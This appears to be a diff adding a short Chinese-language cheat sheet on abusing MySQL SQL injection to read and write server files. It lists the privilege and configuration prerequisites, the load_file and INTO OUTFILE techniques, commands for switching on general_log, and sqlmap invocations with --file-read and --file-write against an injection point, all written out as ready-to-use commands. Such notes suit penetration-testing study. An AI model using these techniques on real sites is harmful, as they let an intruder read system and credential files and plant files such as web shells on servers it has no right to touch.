@@ -1,0 +1,18 @@
+读文件前提：
+1.存在注入点的web站点用户权限要足够高
+2.secure_file_priv不为NULL（show global variables like "secure_file_priv";）(否则就没办法使用mysql中的函数进行读写)
+
+读文件函数：
+select load_file('路径');
+
+写文件前提：
+general_log = on
+(查看general_log：show variables like'%general%';
+修改general_log为on:set global general_log = on;)
+
+写文件
+select 字段名 from 表 into outfile "路径"
+
+使用sqlmap读写文件
+读文件：sqlmap -u ”注入点“ --file-read "待读取文件路径"
+写文件（将文件A的内容写入到文件B）：sqlmap -u "注入点" --file-write "文件A路径" --file-dest "写入文件B路径"
